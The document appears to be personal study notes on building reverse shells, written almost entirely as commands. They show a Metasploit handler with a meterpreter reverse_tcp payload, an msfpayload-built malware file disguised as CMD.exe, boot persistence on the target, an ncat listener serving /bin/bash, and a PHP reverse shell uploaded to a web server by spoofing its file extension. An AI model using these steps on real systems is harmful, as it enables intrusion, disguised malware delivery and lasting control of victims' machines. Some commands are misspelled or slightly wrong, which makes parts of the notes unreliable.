1. Metasploit is a tool to create reverse shell
2. Metasplit is faster if it can use a local database.
    - `service postgresql start`
    - `service metasploit start`
    - To update metasploit, run `msfupdate
3. `msfconsole` : metasploit console. All of the following commands are executed in msfconsole
    - `banner` : displays the metasploit banner
    - `help` : Display available commands
    - `search -h` : list the options to pass on 'search' command.
    - `search name:meterpreter` : displays list of exploits available for meterpreter
    - `use exploit/multi/handler` : 'use' is to use any available exploit mentioned in above search command
        - It will open exploit specific shell
        - `show options` : options available for the given exploit
        - `set payload windows/meterpreter/reverse_tcp` : It will set the payload that was used to create infected file
        - once payload is set, more options are available which can be seen using 'show options' command
        - `set LHOST 192.168.1.21`
        - `exploit` : starts the current exploit
        - ` session -l` : Lists all the connected sessions of current exploit
        - ` session -h` : Lists all the options for session command
4. Redirect reverse shell request to own server:
    - `msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.21 x > /root/Desktop/CMD.exe`
    - CMD.exe file generated above is the infected file that when run on victim's device will create reverse shell
5. Once the exploit is running as per step 3, then whenever someone runs the infected file on their system, then reverse shell will be
    created on the meterpreter terminal where exploit is running
    - In the reverse shell, run `shell` to open the cmd of target device
    - It will open a shell that will imitate target system
    - any command ran on this shell will act on target system
    - `help` : list of available commands for current exploit
    - `run persistent -h` : help menu for persistent command
    - `run persistent -X` : Creates a persistent shell that will run on system boot
6. reverse shell using NetCat
    - `ncat --help`
    - `ncat -v -l -p 8888 -e /bin/bash` : It will open a listner on port 8888
    - On another device, run `ncat <destination IP> 8888` : It will connect to destination IP on port 8888 which was opened via above command
7. Uploading reverse shell on webs server
    - use nmap to scan which system is vulnerable to php reverse shell (use script to check php version)
    - search 'pentestmonkey php reverse shell' and download the tar file
    - extract the tar file and search for file with .php extension
    - rename the file to make it upload compatible. Eg. file.php.jpg
    - Use burpsuite to intercept the upload request, and change the file extension back to .php, nad forward the request to server.